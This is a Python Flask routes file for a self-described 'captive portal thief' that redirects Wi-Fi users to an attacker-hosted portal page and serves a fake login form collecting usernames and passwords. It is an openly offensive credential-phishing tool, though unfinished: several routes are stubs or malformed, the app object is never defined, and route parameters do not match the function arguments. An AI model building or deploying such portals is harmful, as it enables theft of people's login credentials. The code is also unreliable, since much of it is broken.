
#!/usr/bin/python3
# -*- coding: utf-8 -*-
################################################################################
##   Captive portal thief/ rehosting daemon  -   python , flask , sqlalchemy  ##
################################################################################
# Copyright (c) 2020 Adam Galindo                                             ##
#                                                                             ##
# Permission is hereby granted, free of charge, to any person obtaining a copy##
# of this software and associated documentation files (the 'Software'),to deal##
# in the Software without restriction, including without limitation the rights##
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell   ##
# copies of the Software, and to permit persons to whom the Software is       ##
# furnished to do so, subject to the following conditions:                    ##
#                                                                             ##
# Licenced under GPLv3                                                        ##
# https://www.gnu.org/licenses/gpl-3.0.en.html                                ##
#                                                                             ##
# The above copyright notice and this permission notice shall be included in  ##
# all copies or substantial portions of the Software.                         ##
#
# THE SOFTWARE IS PROVIDED 'AS IS', WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
# THE SOFTWARE.
################################################################################

__author__  = 'Adam Galindo'
__email__   = 'null@null.com'
__version__ = '1'
__license__ = 'GPLv3'
__name__    = 'captive_portal using pybashy - routes.py'
__notes__   = 'refactor to subfolder for extensibility'

from flask import Flask
from flask import request

@CaptivePortal.route('/index',  methods=['GET', 'POST'])
def index():
    return "HEY BITCH"

@CaptivePortal.route('/stolen_portal',  methods=['POST'])
def stolen_portal():
    pass

@CaptivePortal.route('/intercept/<portalpage>/<ipaddress>/<PORT>/', methods=['GET', 'POST'])
def intercept(portalpage = '/login.php.html', PORT = 8080, ip_adrress = '192.168.0.8'):
    ''' 
    Performs a redirect via HTML
    '''
    # redirect to captive portal via user-interfacing software layers
    return 'Content-Type : text/html \n Location : /' + portalpage + '\n' + \
'<html>\n<head>\n<meta http-equiv="refresh" content="0;url=' + ip_adrress + PORT + portalpage + \
'" />\n</head>\n<body></body>\n</html>'

# use this one because it prettier, the smaller one is for obfuscation later in the project
@CaptivePortal.route('/html_redirect/<ip_adrress>/<PORT>/<portalpage>/')
def html_redirect():
    return """
<html>
<head>
<meta http-equiv="refresh" content="0; url=http://{0}{1}{2}" />
</head>
<body>
<b>Redirecting to Man in the middle attack on a HACKER hosted captive portal page!</b>
YOU ARE BEING ATTACKED!
</body>
</html>
""".format(ip_adrress, PORT, portalpage)

@CaptivePortal.route('/html_login/<>/<>/<>/', methods=['GET', 'POST'])
def html_login_thief():
    return """
<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8" />
<title></title>
</head>
<body>
<form class="login" action="do_POST" method="post">
<input type="text" name="username" value="username">
<input type="text" name="password" value="password">
<input type="submit" name="submit" value="submit">
</form>
</body>
</html>
"""